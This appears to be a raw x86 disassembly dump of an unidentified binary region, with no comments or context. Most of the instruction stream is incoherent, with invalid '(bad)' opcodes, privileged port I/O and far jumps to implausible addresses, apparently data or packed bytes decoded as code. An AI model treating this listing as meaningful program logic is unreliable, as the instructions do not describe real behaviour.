  416a67:	outs   dx,DWORD PTR ds:[esi]
  416a68:	dec    edx
  416a69:	jle    0x416a2c
  416a6b:	out    dx,eax
  416a6c:	push   ebx
  416a6d:	aaa    
	...
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x2c20ba3
  416ae4:	dec    ebp
  416ae5:	mov    ebx,0xf467
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	adc    DWORD PTR [edx],ebp
  416af0:	jne    0x416ac3
  416af2:	test   eax,0x129dc14b
  416af7:	cmp    eax,0xc2509fa8
  416afc:	cli    
  416afd:	in     eax,0xcf
  416aff:	gs scas al,BYTE PTR es:[edi]
  416b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b02:	ret    
  416b03:	mov    al,0xb3
  416b05:	fstp   DWORD PTR [ebx+0xe]
  416b08:	adc    BYTE PTR [eax],bl
  416b0a:	push   eax
  416b0b:	repz xchg ebx,eax
  416b0d:	push   ebp
  416b0e:	jg     0x416b15
  416b10:	and    dh,cl
  416b12:	xchg   eax,edi
  416b14:	jnp    0x416af6
  416b16:	fimul  DWORD PTR [ebp+0x6116f531]
  416b1c:	test   al,0x3d
  416b1e:	pop    esp
  416b1f:	and    eax,0xf2a88f16
  416b24:	(bad)  
  416b25:	jmp    0x416b6d
  416b27:	xchg   esi,eax
  416b28:	mov    cl,0x8
  416b2a:	xchg   edx,eax
  416b2b:	cmp    eax,0x2e049c68
  416b30:	aas    
  416b31:	sub    al,0x4b
  416b33:	jmp    0x416b03
  416b35:	shl    BYTE PTR [eax],1
  416b37:	neg    DWORD PTR ds:0x36a27cd
  416b3d:	or     DWORD PTR [edx+0x4f],esi
  416b40:	jl     0x416aff
  416b42:	xor    esi,DWORD PTR [ebp+0x60f01ece]
  416b48:	or     al,0xb6
  416b4a:	(bad)
  416b4e:	fmul   QWORD PTR [edx]
  416b50:	xor    edi,DWORD PTR [edi]
  416b52:	test   BYTE PTR [edx],ch
  416b54:	lods   al,BYTE PTR ds:[esi]
  416b55:	shr    DWORD PTR [edx],1
  416b57:	shr    ah,0x71
  416b5a:	cld    
  416b5b:	aam    0x62
  416b5d:	mov    eax,ds:0xb62b1853
  416b62:	push   ss
  416b63:	pop    ds
  416b64:	lods   eax,DWORD PTR ds:[esi]
  416b65:	fcomi  st,st(4)
  416b67:	mov    esp,0x16472285
  416b6c:	push   edx
  416b6d:	cmp    eax,0x3d2958e5
  416b72:	or     dl,bh
  416b74:	mov    ebx,0xfe955fcd
  416b79:	add    eax,0x48020bf8
  416b7e:	ss pop ds
  416b80:	push   ebx
  416b81:	jno    0x416b04
  416b83:	adc    al,0x18
  416b85:	dec    eax
  416b86:	out    dx,eax
  416b87:	jmp    0x4b54:0x96069759
  416b8e:	scas   eax,DWORD PTR es:[edi]
  416b8f:	cmp    ah,cl
  416b91:	xchg   ecx,eax
  416b92:	inc    esp
  416b93:	jmp    0xf448:0xa2b14b8c
  416b9a:	pusha  
  416b9b:	leave  
  416b9c:	out    0x2e,eax
  416b9e:	imul   eax,edi,0xffffffbd
  416ba1:	inc    ebx
  416ba2:	xor    cl,dh
  416ba4:	rol    BYTE PTR [eax-0x2b90cb73],0x6c
  416bab:	mov    BYTE PTR ds:0xdf32d6a5,dh
  416bb1:	jge    0x416b59
  416bb3:	std    
  416bb4:	and    al,0xd4
  416bb6:	jle    0x416b4f
  416bb8:	int    0xf6
  416bba:	push   ds
  416bbb:	mov    ebx,0xfae0de84
  416bc0:	ja     0x416bbf
  416bc2:	jmp    0xcd4525ba
  416bc7:	inc    ebp
  416bc8:	imul   ebp,edi,0x846788c1
  416bce:	mov    ebx,0x4370786
  416bd4:	dec    eax
  416bd5:	or     esi,DWORD PTR [ebp-0x6f665165]
  416bdb:	inc    ebx
  416bdc:	sub    BYTE PTR [edi+0x32cf098],bl
  416be2:	cmp    al,BYTE PTR [ecx]
  416be4:	mov    ds:0x628a6031,eax
  416be9:	cld    
  416bea:	stos   BYTE PTR es:[edi],al
  416beb:	(bad)  
  416bed:	mov    ds:0x0,eax
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0x545b70a9
  416c63:	push   ss
  416c64:	cli    
  416c65:	ret    0xf567
  416c68:	add    BYTE PTR [eax],al
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	fcmovnbe st,st(7)
  416c70:	push   ecx
  416c71:	sub    al,0x87
  416c73:	loopne 0x416ceb
  416c75:	bound  ebx,QWORD PTR [esi+eax*2-0x3b]
  416c79:	adc    eax,0x535419f8
  416c7e:	jmp    0x6537a18e
  416c83:	retf   0x6d1b
  416c86:	mov    al,0x10
  416c88:	cmp    eax,0x588955fe
  416c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c8e:	lods   al,BYTE PTR ds:[esi]
  416c8f:	ficomp WORD PTR [ebp+edx*2+0x6090683b]
  416c96:	stc    
  416c97:	ins    DWORD PTR es:[edi],dx
  416c98:	jg     0x416c42
  416c9a:	leave  
  416c9b:	pop    esp
  416c9c:	push   0xd1e0ea68
  416ca1:	xchg   esp,ebp
  416ca3:	aas    
  416ca4:	jo     0x416d23
  416ca6:	scas   al,BYTE PTR es:[edi]
  416ca7:	jbe    0x416c68
  416ca9:	into   
  416caa:	popa   
  416cab:	pop    es
  416cac:	fstp   QWORD PTR [edi+0x73f4dbb3]
  416cb2:	pushfw 
  416cb4:	jns    0x416d1c
  416cb6:	clc    
  416cb7:	cmp    DWORD PTR [ecx],ebp
  416cb9:	push   esi
  416cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cbb:	and    ah,BYTE PTR [ebx]
  416cbd:	add    eax,DWORD PTR [eax]
  416cbf:	sbb    eax,0x9a96c2fb
  416cc4:	sub    DWORD PTR ss:0x489038a7,eax
  416ccb:	and    eax,0x43a17451
  416cd0:	test   DWORD PTR [ecx],ebp
  416cd2:	inc    ebp
  416cd3:	mov    bh,0x3e
  416cd5:	jmp    0x416c60
  416cd7:	and    esp,esi
  416cd9:	sub    edi,0x3a
  416cdc:	and    DWORD PTR [ecx+eiz*4+0x56],esi
  416ce0:	(bad)  
  416ce1:	outs   dx,BYTE PTR ds:[esi]
  416ce2:	stos   DWORD PTR es:[edi],eax
  416ce3:	mov    ds:0xbd460de0,al
  416ce8:	cmp    al,0x6a
  416cea:	add    BYTE PTR [eax],ah
  416cec:	dec    ecx
  416ced:	shl    BYTE PTR [ebx],1
  416cef:	adc    ecx,esp
  416cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cf2:	ins    BYTE PTR es:[edi],dx
  416cf3:	daa    
  416cf4:	cwde   
  416cf5:	dec    ebx
  416cf6:	inc    edx
  416cf7:	in     al,dx
  416cf8:	pop    es
  416cf9:	jmp    0x416d17
  416cfb:	gs aaa 
  416cfd:	mov    BYTE PTR [edx+0x43cee797],bl
  416d03:	lea    edi,[ecx+edx*4+0x7]
  416d07:	sbb    ecx,DWORD PTR [edi]
  416d09:	sti    
  416d0a:	jmp    0x9be8e5eb
  416d0f:	mov    ecx,0x16ebddde
  416d14:	and    esi,DWORD PTR [esi-0x6f20f027]
  416d1a:	sti    
  416d1b:	scas   eax,DWORD PTR es:[edi]
  416d1c:	adc    BYTE PTR [ebp+0x3d],dl
  416d1f:	ds cmp eax,0xf6f87e51
  416d25:	xor    bl,0x37
  416d28:	xor    eax,0xf488769b
  416d2d:	data16 sub BYTE PTR [edx+edi*8-0x4b],bh
  416d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d33:	push   ds
  416d34:	gs jno 0x416d6c
  416d37:	test   al,0xb2
  416d39:	xor    eax,ebp
  416d3b:	jg     0x416d0a
  416d3d:	mov    esp,0xce212f3a
  416d42:	data16 jmp 0x416d1e
  416d45:	xchg   ebp,eax
  416d46:	xchg   esp,eax
  416d47:	loopne 0x416d7c
  416d49:	fldcw  WORD PTR ds:0x3449739e
  416d4f:	sub    al,0x84
  416d51:	inc    esi
  416d52:	ficomp DWORD PTR [edi+0x624f3fbe]
  416d58:	inc    ecx
  416d59:	fbstp  TBYTE PTR [edx+0x1c]
  416d5c:	leave  
  416d5d:	int3   
  416d5e:	rcl    ecx,1
  416d60:	dec    eax
  416d61:	daa    
  416d62:	push   0x4d
  416d64:	aam    0x1a
  416d66:	mov    eax,ds:0xbe5ae3aa
  416d6b:	inc    ecx
  416d6c:	add    DWORD PTR [ebp+0x0],eax
	...
  416dd6:	and    DWORD PTR [ebx-0x40445077],edx
  416ddc:	daa    
  416ddd:	lahf   
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	cmp    BYTE PTR [ebp+0x6c],al
  416de5:	in     al,dx
  416de6:	test   BYTE PTR [bx+si],0x0
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	mov    ds:0x85095de4,eax
  416df3:	jae    0x416e35
  416df5:	fcmovnb st,st(2)
  416df7:	test   eax,0xb3aab1e9
  416dfc:	aam    0xbf
  416dfe:	or     eax,0xd9b5015e
  416e03:	test   al,0x46
  416e05:	and    al,0x2
  416e07:	iret   
  416e08:	stos   DWORD PTR es:[edi],eax
  416e09:	pop    edi
  416e0a:	sub    dh,BYTE PTR [edi+edi*4]
  416e0d:	or     DWORD PTR [eax+esi*4-0x35],esp
  416e11:	aaa    
  416e12:	add    bl,BYTE PTR [esi]
  416e14:	adc    BYTE PTR [edi+0x79ad63a7],ch
  416e1a:	cmp    DWORD PTR [esi-0x1],esp
  416e1d:	fmul   DWORD PTR [ecx+0x3a]
  416e20:	pushf  
  416e21:	and    DWORD PTR ds:0x1c04106e,ecx
  416e27:	js     0x416e8b
  416e29:	sub    al,0xad
  416e2b:	ins    BYTE PTR es:[edi],dx
  416e2c:	jo     0x416dd9
  416e2e:	addr16 dec esi
  416e30:	push   eax
  416e31:	outs   dx,BYTE PTR ds:[esi]
  416e32:	rol    BYTE PTR [edx-0x2a],0x62
  416e36:	call   0xf22b:0x6b95c91
  416e3d:	xor    ebx,edx
  416e3f:	rol    DWORD PTR [ebx+ecx*1+0x68768220],0x2e
  416e47:	out    0x22,al
  416e49:	and    al,0xf9
  416e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e4c:	ss pop ds
  416e4e:	mov    ds:0xcf25fb4a,eax
  416e53:	push   cs
  416e54:	loope  0x416e7f
  416e56:	rol    DWORD PTR [edi],1
  416e58:	repz inc edi
  416e5a:	mov    al,ds:0x389af1ad
  416e5f:	je     0x416e01
  416e61:	cmp    dl,dh
  416e63:	xchg   esp,eax
  416e64:	mov    dh,0xe2
  416e66:	data16 cmc 
  416e68:	je     0x416e75
  416e6a:	aad    0x4f
  416e6c:	jo     0x416edd
  416e6e:	mov    dh,0x79
  416e70:	cmp    BYTE PTR [edx-0x79b1ad73],bh
  416e76:	rcr    BYTE PTR [esp+eiz*4+0x5],0x2c
  416e7b:	je     0x416e34
  416e7d:	cmp    esp,DWORD PTR [edi+0x211975ff]
  416e83:	sub    ah,ah
  416e85:	int3   
  416e86:	push   es
  416e87:	stos   DWORD PTR es:[edi],eax
  416e88:	cdq    
  416e89:	in     eax,0x5c
  416e8b:	mov    BYTE PTR ds:0x1a36fbb9,ah
  416e91:	into   
  416e92:	sahf   
  416e93:	and    eax,DWORD PTR ds:0x9edbc80c
  416e99:	xor    bh,BYTE PTR [edx-0x448ba09d]
  416e9f:	inc    esi
  416ea0:	pop    ebp
  416ea1:	out    0xf4,eax
  416ea3:	loopne 0x416e76
  416ea5:	iret   
  416ea6:	lods   al,BYTE PTR ds:[esi]
  416ea7:	cmc    
  416ea8:	test   DWORD PTR [edx-0xf],ecx
  416eab:	jl     0x416e74
  416ead:	hlt    
  416eae:	arpl   WORD PTR [ebx-0x689a7c02],dx
  416eb4:	cmp    esp,ebx
  416eb6:	mov    eax,ds:0xecac4592
  416ebb:	xchg   edx,eax
  416ebc:	mov    ah,0x50
  416ebe:	lds    eax,FWORD PTR [edi+0x6b]
  416ec1:	enter  0x14df,0x80
  416ec5:	mov    bh,0x79
  416ec7:	sbb    eax,0x3140a893
  416ecc:	sub    ebx,DWORD PTR [ecx-0x125ea315]
  416ed2:	mov    bh,0x9e
  416ed4:	mov    ds:0x12b746a6,ax
  416eda:	and    bh,BYTE PTR [edx+0x5712774f]
  416ee0:	push   bp
  416ee2:	mov    ds:0xa9b61b87,eax
  416ee7:	jno    0x416f37
  416ee9:	sub    BYTE PTR [ebx+edx*8],dh
  416eec:	sub    ebp,DWORD PTR [edx+0x0]
	...
  416f53:	add    BYTE PTR [eax],al
  416f55:	add    BYTE PTR [edi-0x519271e7],bh
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0xa5a98eea
  416f64:	mov    al,ds:0xf7673a
  416f69:	add    BYTE PTR [eax],al
  416f6b:	add    DWORD PTR [eax],eax
  416f6d:	add    BYTE PTR [edx-0x40a2f08e],cl
  416f73:	or     ah,BYTE PTR [ebx-0x66630020]
  416f79:	sub    BYTE PTR [ecx-0x20],al
  416f7c:	ds mov ebp,0xa48d7164
  416f82:	and    cl,BYTE PTR [ebp-0x389ab96b]
  416f88:	xchg   esi,eax
  416f89:	inc    ebx
  416f8a:	mov    al,0x75
  416f8c:	data16 je 0x416f30
  416f8f:	retf   
  416f90:	stc    
  416f91:	dec    esi
  416f92:	add    eax,0xfd174489
  416f97:	dec    edx
  416f98:	push   ebx
  416f99:	pop    ds
  416f9a:	mov    edi,0xae373d02
  416f9f:	ftst   
  416fa1:	bnd jae 0x416f35
  416fa4:	mov    WORD PTR [edi+0xb1c3620],ss
  416faa:	out    dx,eax
  416fab:	sub    al,bl
  416fad:	sahf   
  416fae:	and    eax,DWORD PTR [ebp-0x658f1f2d]
  416fb4:	mov    dh,0x21
  416fb6:	mov    al,0xd5
  416fb8:	ss (bad) 
  416fba:	sti    
  416fbb:	(bad)  
  416fbc:	daa    
  416fbd:	les    esp,FWORD PTR [ebx-0x1297742]
  416fc3:	in     eax,0xb
  416fc5:	or     DWORD PTR [esi+0x11258117],ebp
  416fcb:	ja     0x416fd8
  416fcd:	push   ecx
  416fce:	mov    dl,0xa4
  416fd0:	pushf  
  416fd1:	test   eax,0x3ed256e
  416fd6:	sahf   
  416fd7:	lods   al,BYTE PTR ds:[esi]
  416fd8:	push   0xa9807f68
  416fdd:	imul   edx,DWORD PTR es:[ecx],0xffffffb6
  416fe1:	sbb    eax,0x266f4903
  416fe6:	cwde   
  416fe7:	fwait
  416fe8:	into   
  416fe9:	ds es in eax,dx
  416fec:	jmp    0xf4dd6efa
  416ff1:	es add bl,dh
  416ff4:	pop    es
  416ff5:	jge    0x416f8b
  416ff7:	jns    0x417043
  416ff9:	xchg   DWORD PTR [eax-0x3d],ebx
  416ffc:	xchg   edx,eax
  416ffd:	jno    0x41706f
  416fff:	stos   BYTE PTR es:[edi],al
  417000:	xor    bl,BYTE PTR [edi-0x5]
  417003:	sub    BYTE PTR [ebx],al
  417005:	aaa    
  417006:	dec    esp
  417007:	add    al,BYTE PTR [edx]
  417009:	mov    ebx,0x7f033a4
  41700e:	inc    ecx
  41700f:	dec    ebx
  417010:	or     edx,esi
  417012:	loope  0x41700c
  417014:	jle    0x417079
  417016:	mov    esi,DWORD PTR [esi+edi*8-0x68b5c3e2]
  41701d:	js     0x416fe3
  41701f:	inc    eax
  417020:	xor    al,0xaa
  417022:	cdq    
  417023:	adc    esi,DWORD PTR [eax-0x38]
  417026:	fsubr  QWORD PTR [ebp-0x79]
  417029:	test   DWORD PTR ds:0x9af29466,ebp
  41702f:	imul   eax,DWORD PTR [esp+ecx*8+0x14ad61d8],0xa806ec3f
  41703a:	shl    cl,cl
  41703c:	push   ecx
  41703d:	inc    edi
  41703e:	cli    
  41703f:	cli    
  417040:	out    0x61,al
  417042:	pop    edx
  417043:	aam    0x94
  417045:	(bad)  
  417046:	stos   BYTE PTR es:[edi],al
  417047:	xor    al,0x3
  417049:	out    dx,al
  41704a:	shl    BYTE PTR ds:0x7162bbd1,0xf2
  417051:	mov    ebx,0xe319299c
  417056:	popa   
  417057:	aam    0x80
  417059:	repnz in al,dx
  41705b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41705c:	cli    
  41705d:	mov    ch,0x18
  41705f:	mov    edx,0x8a5355d2
  417064:	mov    ebp,0x148b2748
  417069:	in     eax,0x43
  41706b:	mov    eax,ds:0x76bd
	...
  4170d4:	add    BYTE PTR [eax],al
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    edx,DWORD PTR [ebx]
  4170e3:	fnstsw WORD PTR [ecx+0xf86715]
  4170e9:	add    BYTE PTR [eax],al
  4170eb:	add    DWORD PTR [eax],eax
  4170ed:	add    al,dl
  4170ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170f0:	pop    es
  4170f1:	add    eax,0x2ae7079d
  4170f6:	sub    BYTE PTR [ecx-0x1d16c094],bl
  4170fc:	stc    
  4170fd:	arpl   bp,si
  4170ff:	retf   0xfeb5
  417102:	xchg   ebp,eax
  417103:	popf   
  417104:	int3   
  417105:	retf   0x1c38
  417108:	jnp    0x4170fd
  41710a:	fnstsw WORD PTR [edi]
  41710c:	or     eax,0xeae2239c
  417111:	adc    al,0x7a
  417113:	popa   
  417114:	retf   
  417115:	popf   
  417116:	loop   0x417133
  417118:	xchg   ecx,eax
  417119:	pop    esi
  41711a:	mov    cl,0xe4
  41711c:	inc    edx
  41711d:	dec    ecx
  41711e:	out    0x18,eax
  417120:	xchg   esp,eax
  417121:	leave  
  417122:	call   0x15ace877
  417127:	aaa    
  417128:	mov    bl,0xcc
  41712a:	(bad)  
  41712b:	jmp    0x41712c
  41712d:	add    BYTE PTR [edi-0x4c2a485],bh
  417133:	xchg   ecx,eax
  417134:	imul   DWORD PTR [edi]
  417136:	jmp    0x417184
  417138:	pop    edi
  417139:	ret    0x6d1
  41713c:	or     eax,0x9c31fdae
  417141:	xor    BYTE PTR [ecx+0x52],al
  417144:	loop   0x417148
  417146:	dec    edx
  417147:	mov    ch,0x5a
  417149:	loopne 0x41716e
  41714b:	inc    ecx
  41714c:	pusha  
  41714d:	push   esp
  41714e:	dec    ecx
  41714f:	jp     0x41710c
  417151:	repnz in al,0xfd
  417154:	test   DWORD PTR [edx-0x6f],esi
  417157:	in     al,dx
  417158:	inc    ebp
  417159:	es call 0x287dc330
  41715f:	mov    al,0xcb
  417161:	dec    ebx
  417162:	sub    bl,ah
  417164:	sub    dl,BYTE PTR [eax+edx*1]
  417167:	out    dx,eax
  417168:	retf   
  417169:	push   0x8cf6dda1
  41716e:	fsubr  DWORD PTR [ebp-0xe]
  417171:	and    al,0x2c
  417173:	inc    BYTE PTR [edi-0x7b]
  417176:	ins    DWORD PTR es:[edi],dx
  417177:	pop    ds
  417178:	push   ss
  417179:	inc    BYTE PTR [edx-0x7c]
  41717c:	inc    ebp
  41717d:	je     0x4171df
  41717f:	gs cs push ss
  417182:	dec    ebx
  417183:	mov    edx,0x9b1e37f6
  417188:	push   es
  417189:	fisttp QWORD PTR [edx]
  41718b:	stos   BYTE PTR es:[edi],al
  41718c:	(bad)  
  41718d:	add    ah,al
  41718f:	bound  ebp,QWORD PTR [ebx+0x4a]
  417192:	es fwait
  417194:	inc    edi
  417195:	push   ss
  417196:	js     0x4171a7
  417198:	xchg   ebx,eax
  417199:	adc    eax,0xf67d5a14
  41719e:	fisubr WORD PTR [ebp+0xf]
  4171a1:	(bad)  
  4171a3:	or     al,0xe2
  4171a5:	into   
  4171a6:	(bad)  
  4171a7:	pop    ebp
  4171a8:	jge    0x4171b3
  4171aa:	pusha  
  4171ab:	repnz cmp cl,cl
  4171ae:	add    DWORD PTR [eax-0x12],ebx
  4171b1:	fs scas eax,DWORD PTR es:[edi]
  4171b3:	lds    ebp,FWORD PTR [ebp+0x7122c32a]
  4171b9:	xlat   BYTE PTR ds:[ebx]
  4171ba:	dec    ecx
  4171bb:	(bad)  
  4171bc:	sbb    BYTE PTR [eax],dl
  4171be:	add    dl,cl
  4171c0:	mul    BYTE PTR es:[eax+0x2d]
  4171c4:	scas   al,BYTE PTR es:[edi]
  4171c5:	dec    ebp
  4171c6:	jl     0x4171ef
  4171c8:	or     BYTE PTR [edi],dl
  4171ca:	cmp    ch,bh
  4171cc:	ror    BYTE PTR [ebp+0x1636ab1e],1
  4171d2:	outs   dx,BYTE PTR ds:[esi]
  4171d3:	loop   0x4171f8
  4171d5:	xchg   ebx,eax
  4171d6:	cmp    BYTE PTR [ebx-0x3c],bl
  4171d9:	nop
  4171da:	jbe    0x4171a8
  4171dc:	mov    ah,0x4
  4171de:	jmp    0xfa03241f
  4171e3:	fxch   st(1)
  4171e5:	in     al,0x44
  4171e7:	gs mov bl,0x7d
  4171ea:	sub    bh,dh
  4171ec:	outs   dx,BYTE PTR ds:[esi]
  4171ed:	jge    0x4171ef
	...
  417253:	add    BYTE PTR [eax],al
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	mov    ecx,0x67777f4f
  417267:	stc    
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	retf   0xc97e
  417271:	xchg   BYTE PTR [ecx],bl
  417273:	imul   esp,DWORD PTR [eax+edx*1],0xf6efc0f0
  41727a:	mov    ebp,0xdbb1a75a
  41727f:	xor    DWORD PTR [ebp-0x9],ebx
  417282:	mov    al,0xa0
  417284:	ins    BYTE PTR es:[edi],dx
  417285:	inc    edi
  417286:	cmp    al,BYTE PTR fs:[eax-0x7888798c]
  41728d:	std    
  41728e:	add    edx,DWORD PTR ds:0x967081ed
  417294:	dec    ebp
  417295:	push   ebx
  417296:	sub    eax,edx
  417298:	push   ecx
  417299:	cmp    DWORD PTR [ebp+0x2b],ebx
  41729c:	int3   
  41729d:	push   cs
  41729e:	fisub  DWORD PTR ds:[ecx+eax*1-0x41]
  4172a3:	dec    edx
  4172a4:	inc    esi
  4172a5:	mov    edx,?
  4172a7:	ds addr16 xor al,0xf
  4172ab:	sub    bl,ch
  4172ad:	dec    esi
  4172ae:	aaa    
  4172af:	mov    ds:0x42aa4784,eax
  4172b4:	mov    ds,WORD PTR es:[eax-0x6007e42c]
  4172bb:	pop    ebx
  4172bc:	xor    BYTE PTR [ecx+eax*4],dl
  4172bf:	(bad)  
  4172c0:	push   edi
  4172c1:	inc    ebp
  4172c2:	fdivr  QWORD PTR [ecx+0x19]
  4172c5:	xchg   DWORD PTR [ebx+0x31],ebp
  4172c8:	pop    ebx
  4172c9:	daa    
  4172ca:	scas   al,BYTE PTR es:[edi]
  4172cb:	cld    
  4172cc:	jg     0x4172c3
  4172ce:	fsub   QWORD PTR [ecx+eax*4]
  4172d1:	adc    BYTE PTR [edi+0x74],bl
  4172d4:	clc    
  4172d5:	not    BYTE PTR [esp+eiz*4]
  4172d8:	mov    esp,DWORD PTR [ebx+ebp*8+0x7a]
  4172dc:	inc    ecx
  4172dd:	leave  
  4172de:	aad    0x91
  4172e0:	xor    BYTE PTR [ebp-0x608caaed],ah
  4172e6:	(bad)  
  4172e8:	es aaa 
  4172ea:	ds call 0xdbc82933
  4172f0:	ja     0x417336
  4172f2:	out    0x1a,al
  4172f4:	inc    ecx
  4172f5:	dec    esp
  4172f6:	retf   
  4172f7:	sub    ebp,esi
  4172f9:	arpl   WORD PTR [ebx+0x6b],bp
  4172fc:	and    ecx,DWORD PTR [ecx]
  4172fe:	fsubr  DWORD PTR [ebx]
  417300:	inc    edx
  417301:	lods   eax,DWORD PTR ds:[esi]
  417302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417303:	rol    DWORD PTR [esi],0xad
  417306:	stos   DWORD PTR es:[edi],eax
  417307:	sub    esi,DWORD PTR [esi+ebx*4+0x3516cd1c]
  41730e:	xor    BYTE PTR ds:0x63ee189a,ah
  417314:	aaa    
  417315:	aas    
  417316:	lock ss sbb al,0xc2
  41731a:	mov    ah,0x35
  41731c:	inc    edi
  41731d:	cmp    eax,0x8c078314
  417322:	cmp    DWORD PTR [eax-0x6e],esi
  417325:	sub    cl,BYTE PTR fs:[esi+0x28]
  417329:	dec    ecx
  41732a:	xchg   ebx,eax
  41732b:	jnp    0x4172b1
  41732d:	sub    eax,0x4b8d45e7
  417332:	mov    al,ds:0x890987f5
  417337:	popa   
  417338:	js     0x4173ab
  41733a:	lea    ecx,[edi+0x47]
  41733d:	and    al,0xf4
  41733f:	call   esp
  417341:	inc    edi
  417342:	out    dx,eax
  417343:	ret    
  417344:	dec    ebx
  417345:	dec    esp
  417346:	jne    0x41734c
  417348:	stos   BYTE PTR es:[edi],al
  417349:	mov    eax,ds:0x800157e4
  41734e:	dec    esp
  41734f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417350:	sub    ebp,DWORD PTR [edx+edx*2]
  417353:	ins    DWORD PTR es:[edi],dx
  417354:	test   DWORD PTR [ebx],esp
  417356:	in     eax,dx
  417357:	and    BYTE PTR [ecx],dl
  417359:	out    0xc7,eax
  41735b:	sub    ebx,DWORD PTR [esi]
  41735d:	fnsave [eax+edi*2+0x1bbff740]
  417364:	mov    dh,0xfd
  417366:	scas   al,BYTE PTR es:[edi]
  417367:	or     BYTE PTR [ebx-0x1a53d3d5],al
  41736d:	dec    esi
	...
  4173d6:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  4173e1:	gs stos DWORD PTR es:[edi],eax
  4173e3:	add    ebp,edx
  4173e5:	bound  esp,QWORD PTR [edi-0x6]
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	and    BYTE PTR [edi+0x6d438be9],cl
  4173f4:	adc    edi,ebx
  4173f6:	and    eax,0xc0a20073
  4173fb:	mov    ecx,0xa3edc07c
  417400:	popf   
  417401:	or     al,0x95
  417403:	fwait
  417404:	dec    ebx
  417405:	sbb    DWORD PTR [ebx+0x418355a3],eax
  41740b:	inc    ebp
  41740c:	pop    ebx
  41740d:	daa    
  41740e:	in     al,dx
  41740f:	pop    ecx
  417410:	loope  0x4173ca
  417412:	lods   al,BYTE PTR ds:[esi]
  417413:	xor    eax,0x35ff34cc
  417418:	mov    ds:0x3f3c4931,eax
  41741d:	retf   
  41741e:	aaa    
  41741f:	lods   eax,DWORD PTR ds:[esi]
  417421:	adc    BYTE PTR [edx],ah
  417423:	jno    0x4173cc
  417425:	and    BYTE PTR [edx+0x7c51dbf5],0xd
  41742c:	scas   eax,DWORD PTR es:[edi]
  41742d:	cli    
  41742e:	popa   
  41742f:	xor    DWORD PTR [esp+edx*4],0x1b362de
  417436:	in     al,0x2
  417438:	test   al,0x5b
  41743a:	or     dl,BYTE PTR [ebp+ebp*1+0xf]
  41743e:	mov    ah,0x33
  417440:	add    eax,0xdd02765b
  417445:	adc    eax,0x9875c850
  41744a:	pop    esi
  41744b:	and    eax,DWORD PTR [ecx+0x13]
  41744e:	push   eax
  41744f:	stos   BYTE PTR es:[edi],al
  417450:	jae    0x417441
  417452:	test   al,0xe6
  417454:	out    0x2f,eax
  417456:	jns    0x41746b
  417458:	int3   
  417459:	or     eax,esp
  41745b:	push   esp
  41745c:	ds (bad) 
  41745e:	fwait
  41745f:	mov    ah,0x12
  417461:	retf   0x527c
  417464:	dec    edi
  417465:	pop    ss
  417466:	inc    edi
  417467:	mov    eax,ds:0x3cf6fa28
  41746c:	push   edx
  41746d:	loopne 0x417443
  41746f:	push   ds
  417470:	mov    edx,esi
  417472:	stos   BYTE PTR es:[edi],al
  417473:	add    BYTE PTR [edx+edi*8-0x26f0b4ae],bl
  41747a:	fs aaa 
  41747c:	hlt    
  41747d:	repnz and ah,BYTE PTR [edx+0x19aebc4e]
  417484:	aam    0xa
  417486:	aam    0x55
  417488:	jnp    0x417433
  41748a:	push   ebp
  41748b:	test   BYTE PTR [eax-0x62],bl
  41748e:	pop    ebp
  41748f:	mov    dh,BYTE PTR [esi+edi*4-0x2c2f0bc0]
  417496:	out    dx,al
  417497:	sbb    eax,0x263b5252
  41749c:	rol    BYTE PTR [edi],1
  41749e:	xchg   BYTE PTR [ebx-0x41],bl
  4174a1:	(bad)  
  4174a2:	lods   eax,DWORD PTR ds:[esi]
  4174a3:	aaa    
  4174a4:	lock cdq 
  4174a6:	test   eax,0x1e05c52a
  4174ab:	mov    ds:0xcd2700f,al
  4174b0:	cdq    
  4174b1:	adc    BYTE PTR [ecx],ah
  4174b3:	xor    eax,0x128d8649
  4174b8:	pop    edx
  4174b9:	dec    eax
  4174ba:	int3   
  4174bb:	mov    ds:0x421e6541,eax
  4174c0:	jp     0x417453
  4174c2:	jnp    0x417494
  4174c4:	inc    edx
  4174c5:	xor    BYTE PTR [ecx-0x56],al
  4174c8:	inc    ebp
  4174c9:	repnz arpl WORD PTR [ecx+eax*1],si
  4174cd:	mov    bl,0x7c
  4174cf:	push   esp
  4174d0:	add    al,0xc3
  4174d2:	mov    ah,0xbe
  4174d4:	inc    eax
  4174d5:	lods   al,BYTE PTR ds:[esi]
  4174d6:	ret    0x1062
